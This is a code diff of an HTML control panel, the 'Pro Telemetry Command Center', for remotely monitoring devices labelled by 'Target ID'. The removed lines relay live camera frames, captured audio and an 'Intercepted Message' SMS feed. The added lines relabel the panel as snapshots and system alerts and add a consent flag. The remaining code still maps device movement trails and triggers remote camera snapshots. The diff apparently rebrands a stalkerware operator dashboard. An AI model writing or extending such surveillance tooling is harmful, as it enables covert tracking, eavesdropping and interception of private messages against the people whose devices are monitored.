@@ -2,7 +2,22 @@
 <html>
 
 <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pro Telemetry Command Center</title>
+        <link rel="manifest" href="/static/manifest.json">
+        <meta name="mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="theme-color" content="#000000">
+        <link rel="apple-touch-icon" href="/static/icon-192.png">
+
+        <script>
+            if ('serviceWorker' in navigator) {
+                window.addEventListener('load', () => {
+                    navigator.serviceWorker.register('/static/sw.js');
+                });
+            }
+        </script>
 
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     
@@ -52,7 +67,7 @@
 
         .card:hover { transform: translateY(-5px); border-color: #00ff9c; }
 
-        /* 🎥 Live Viewport Styling */
+        /* 📸 Snapshot Viewport Styling */
         .live-viewport {
             width: 100%;
             height: 160px;
@@ -92,7 +107,7 @@
             border: 2px solid #333;
         }
 
-        /* 📱 SMS Log Table */
+        /* ⚠️ Alert Log Table */
         #sms-log-container {
             width: 95%;
             margin: 20px auto;
@@ -142,13 +157,13 @@
     <div id="map"></div>
 
     <div id="sms-log-container">
-        <h3>📱 Live Notification & SMS Feed</h3>
+        <h3>⚠️ System Alert Feed</h3>
         <table>
             <thead>
                 <tr>
                     <th>Target ID</th>
-                    <th>Source</th>
-                    <th>Intercepted Message</th>
+                    <th>Level</th>
+                    <th>Message</th>
                     <th>Timestamp</th>
                 </tr>
             </thead>
@@ -173,55 +188,19 @@
         const MAX_TRAIL_POINTS = 120;
         const MAX_TRAIL_DEVICES = 80;
         const MIN_TRAIL_DELTA = 0.0002;
-        const MAX_NOTIFICATIONS = 100;
+        const MAX_ALERTS = 100;
         const MAX_SNAPSHOTS = 50;
-        const FRAME_RENDER_INTERVAL_MS = 100;
+        const latestSnapshotByDevice = {};
+        const snapshotStatsByDevice = {};
 
-        const lastFrameRenderByDevice = {};
-        const latestFrameByDevice = {};
-        const mediaStatsByDevice = {};
-        const audioQueue = [];
-        const MAX_AUDIO_QUEUE = 120;
-        let audioPlaying = false;
-        const audioBridge = document.getElementById("audio-bridge");
-
-        function revokeAudioUrl(url) {
-            if (url && url.startsWith('blob:')) {
-                URL.revokeObjectURL(url);
-            }
-        }
-
-        function playNextAudioChunk() {
-            if (audioPlaying || audioQueue.length === 0) return;
-
-            const nextUrl = audioQueue.shift();
-            audioPlaying = true;
-            audioBridge.src = nextUrl;
-            audioBridge.play().catch(() => {
-                audioPlaying = false;
-                audioQueue.unshift(nextUrl);
-            });
-        }
-
-        function onAudioChunkFinished() {
-            revokeAudioUrl(audioBridge.src || '');
-            audioPlaying = false;
-            playNextAudioChunk();
-        }
-
-        audioBridge.addEventListener('ended', onAudioChunkFinished);
-        audioBridge.addEventListener('error', onAudioChunkFinished);
-
-        function getMediaStats(deviceId) {
-            if (!mediaStatsByDevice[deviceId]) {
-                mediaStatsByDevice[deviceId] = {
-                    frames: 0,
-                    audioChunks: 0,
-                    lastFrameAt: 0,
-                    lastAudioAt: 0,
+        function getSnapshotStats(deviceId) {
+            if (!snapshotStatsByDevice[deviceId]) {
+                snapshotStatsByDevice[deviceId] = {
+                    snapshots: 0,
+                    lastSnapshotAt: 0,
                 };
             }
-            return mediaStatsByDevice[deviceId];
+            return snapshotStatsByDevice[deviceId];
         }
 
         function formatAge(timestamp) {
@@ -230,19 +209,15 @@
             return `${seconds}s ago`;
         }
 
-        function paintMediaStats(deviceId) {
-            const stats = mediaStatsByDevice[deviceId];
+        function paintSnapshotStats(deviceId) {
+            const stats = snapshotStatsByDevice[deviceId];
             if (!stats) return;
 
-            const framesEl = document.getElementById(`media-frames-${deviceId}`);
-            const audioEl = document.getElementById(`media-audio-${deviceId}`);
-            const frameAgeEl = document.getElementById(`media-frame-age-${deviceId}`);
-            const audioAgeEl = document.getElementById(`media-audio-age-${deviceId}`);
+            const countEl = document.getElementById(`snapshots-count-${deviceId}`);
+            const ageEl = document.getElementById(`snapshot-age-${deviceId}`);
 
-            if (framesEl) framesEl.textContent = String(stats.frames);
-            if (audioEl) audioEl.textContent = String(stats.audioChunks);
-            if (frameAgeEl) frameAgeEl.textContent = formatAge(stats.lastFrameAt);
-            if (audioAgeEl) audioAgeEl.textContent = formatAge(stats.lastAudioAt);
+            if (countEl) countEl.textContent = String(stats.snapshots);
+            if (ageEl) ageEl.textContent = formatAge(stats.lastSnapshotAt);
         }
 
         // --------------------------------------------------------
@@ -286,30 +261,32 @@
             for (const id in devices) {
                 const d = devices[id];
                 if (d.status === "online") online++;
-                const existingFrame = latestFrameByDevice[id] || "";
-                const waitingStyle = existingFrame ? "display:none;" : "color:#444; font-size:12px;";
-                const stats = getMediaStats(id);
+                const existingSnapshot = latestSnapshotByDevice[id] || "";
+                const waitingStyle = existingSnapshot ? "display:none;" : "color:#444; font-size:12px;";
+                const stats = getSnapshotStats(id);
 
                 htmlParts.push(`
                     <div class="card">
                         <div class="live-viewport">
-                            <img id="stream-${id}" class="live-frame" src="${existingFrame}">
-                            <span id="label-${id}" style="${waitingStyle}">Waiting for Stream...</span>
+                            <img id="stream-${id}" class="live-frame" src="${existingSnapshot}">
+                            <span id="label-${id}" style="${waitingStyle}">Waiting for Snapshot...</span>
                         </div>
                         <b>ID:</b> ${id.substring(0, 12)}<br>
                         <b>Model:</b> ${d.model || "Analyzing..."}<br>
+                        <b>Browser:</b> ${d.browser || "--"}<br>
+                        <b>IP:</b> ${d.ip_address || "--"}<br>
+                        <b>Consent:</b> ${d.consent_granted ? 'YES' : 'NO'}<br>
                         <b>Network:</b> ${d.network || "Standard"}<br>
                         <b>Battery:</b> ${d.battery || "0%"} (${d.charging ? '⚡ Charging' : '🔋 Discharging'})<br>
                         <b>Status:</b> <span style="color:${d.status === 'online' ? '#00ff9c' : '#ff4d4d'}">${d.status.toUpperCase()}</span>
 
                         <div style="margin:10px 0; padding:8px; border:1px solid #1f1f1f; background:#101010; border-radius:6px; font-size:12px; color:#bdbdbd;">
-                            <div><span style="color:#00ff9c; font-weight:bold;">Frames:</span> <span id="media-frames-${id}">${stats.frames}</span></div>
-                            <div><span style="color:#00ff9c; font-weight:bold;">Last frame:</span> <span id="media-frame-age-${id}">${formatAge(stats.lastFrameAt)}</span></div>
-                            <div><span style="color:#00ff9c; font-weight:bold;">Audio chunks:</span> <span id="media-audio-${id}">${stats.audioChunks}</span></div>
-                            <div><span style="color:#00ff9c; font-weight:bold;">Last audio:</span> <span id="media-audio-age-${id}">${formatAge(stats.lastAudioAt)}</span></div>
+                            <div><span style="color:#00ff9c; font-weight:bold;">Snapshots:</span> <span id="snapshots-count-${id}">${stats.snapshots}</span></div>
+                            <div><span style="color:#00ff9c; font-weight:bold;">Last snapshot:</span> <span id="snapshot-age-${id}">${formatAge(stats.lastSnapshotAt)}</span></div>
                         </div>
 
                         <button onclick="requestSnapshot('${id}')">📸 TRIGGER SNAPSHOT</button>
+                        <button onclick="requestPushTest('${id}')">🔔 TEST PUSH</button>
                     </div>
                 `);
 
@@ -344,7 +321,7 @@
             container.innerHTML = htmlParts.join("");
 
             activeIds.forEach((id) => {
-                paintMediaStats(id);
+                paintSnapshotStats(id);
             });
 
             Object.keys(markers).forEach((id) => {
@@ -354,9 +331,8 @@
                     delete markers[id];
                     delete movementPaths[id];
                     delete lastTrailPointByDevice[id];
-                    delete lastFrameRenderByDevice[id];
-                    delete latestFrameByDevice[id];
-                    delete mediaStatsByDevice[id];
+                    delete latestSnapshotByDevice[id];
+                    delete snapshotStatsByDevice[id];
                 }
             });
 
@@ -364,67 +340,21 @@
         });
 
         // --------------------------------------------------------
-        // 🎥 VIDEO STREAMING RELAY
+        // ⚠️ SYSTEM ALERT LOGGING
         // --------------------------------------------------------
-        socket.on("render_frame", (data) => {
-            const now = Date.now();
-            const last = lastFrameRenderByDevice[data.device_id] || 0;
-            if ((now - last) < FRAME_RENDER_INTERVAL_MS) return;
-            lastFrameRenderByDevice[data.device_id] = now;
-            latestFrameByDevice[data.device_id] = data.frame;
-            const stats = getMediaStats(data.device_id);
-            stats.frames += 1;
-            stats.lastFrameAt = now;
-
-            const frameImg = document.getElementById(`stream-${data.device_id}`);
-            const label = document.getElementById(`label-${data.device_id}`);
-            if (frameImg) {
-                frameImg.src = data.frame;
-                if (label) label.style.display = "none";
-            }
-            paintMediaStats(data.device_id);
-        });
-
-        // --------------------------------------------------------
-        // 🔊 AUDIO CAPTURE RELAY
-        // --------------------------------------------------------
-        socket.on("play_audio", (data) => {
-            const deviceId = data.device_id || 'unknown';
-            const stats = getMediaStats(deviceId);
-            stats.audioChunks += 1;
-            stats.lastAudioAt = Date.now();
-            const blob = new Blob([data.audio], { type: 'audio/webm; codecs=opus' });
-            const url = URL.createObjectURL(blob);
-            if (audioQueue.length >= MAX_AUDIO_QUEUE) {
-                revokeAudioUrl(audioQueue.shift());
-            }
-            audioQueue.push(url);
-            playNextAudioChunk();
-            paintMediaStats(deviceId);
-        });
-
-        setInterval(() => {
-            Object.keys(mediaStatsByDevice).forEach((deviceId) => {
-                paintMediaStats(deviceId);
-            });
-        }, 1000);
-
-        // --------------------------------------------------------
-        // 📱 SMS & NOTIFICATION LOGGING
-        // --------------------------------------------------------
-        socket.on("new_notification_alert", (data) => {
+        socket.on("system_alert", (data) => {
             const tableBody = document.getElementById("sms-table-body");
             const newRow = `
                 <tr>
                     <td style="color:#00ff9c">${data.device_id.substring(0, 8)}</td>
-                    <td><b>${data.title}</b></td>
-                    <td>${data.body}</td>
-                    <td>${new Date().toLocaleTimeString()}</td>
+                    <td><b>${data.level || 'info'}</b></td>
+                    <td>${data.message || ''}</td>
+                    <td>${new Date(data.timestamp ? data.timestamp * 1000 : Date.now()).toLocaleTimeString()}</td>
                 </tr>
             `;
             tableBody.insertAdjacentHTML('afterbegin', newRow);
 
-            while (tableBody.children.length > MAX_NOTIFICATIONS) {
+            while (tableBody.children.length > MAX_ALERTS) {
                 tableBody.removeChild(tableBody.lastElementChild);
             }
         });
@@ -436,7 +366,58 @@
             socket.emit("request_snapshot", deviceId);
         }
 
+        async function requestPushTest(deviceId) {
+            try {
+                const response = await fetch(`/push-test/${encodeURIComponent(deviceId)}`);
+                const payload = await response.json().catch(() => ({}));
+
+                const tableBody = document.getElementById("sms-table-body");
+                const level = response.ok ? 'info' : 'error';
+                const message = response.ok
+                    ? `Push test dispatched for ${deviceId.substring(0, 8)}`
+                    : `Push test failed for ${deviceId.substring(0, 8)}: ${payload.error || 'unknown error'}`;
+
+                const newRow = `
+                    <tr>
+                        <td style="color:#00ff9c">${deviceId.substring(0, 8)}</td>
+                        <td><b>${level}</b></td>
+                        <td>${message}</td>
+                        <td>${new Date().toLocaleTimeString()}</td>
+                    </tr>
+                `;
+
+                tableBody.insertAdjacentHTML('afterbegin', newRow);
+                while (tableBody.children.length > MAX_ALERTS) {
+                    tableBody.removeChild(tableBody.lastElementChild);
+                }
+            } catch (_) {
+                const tableBody = document.getElementById("sms-table-body");
+                const newRow = `
+                    <tr>
+                        <td style="color:#00ff9c">${deviceId.substring(0, 8)}</td>
+                        <td><b>error</b></td>
+                        <td>Push test request failed: network/server unavailable</td>
+                        <td>${new Date().toLocaleTimeString()}</td>
+                    </tr>
+                `;
+                tableBody.insertAdjacentHTML('afterbegin', newRow);
+            }
+        }
+
         socket.on("view_snapshot", (data) => {
+            latestSnapshotByDevice[data.device_id] = data.image;
+            const stats = getSnapshotStats(data.device_id);
+            stats.snapshots += 1;
+            stats.lastSnapshotAt = Date.now();
+
+            const frameImg = document.getElementById(`stream-${data.device_id}`);
+            const label = document.getElementById(`label-${data.device_id}`);
+            if (frameImg) {
+                frameImg.src = data.image;
+                if (label) label.style.display = "none";
+            }
+            paintSnapshotStats(data.device_id);
+
             const box = document.getElementById("snapshots");
             const img = document.createElement("img");
             img.src = data.image;
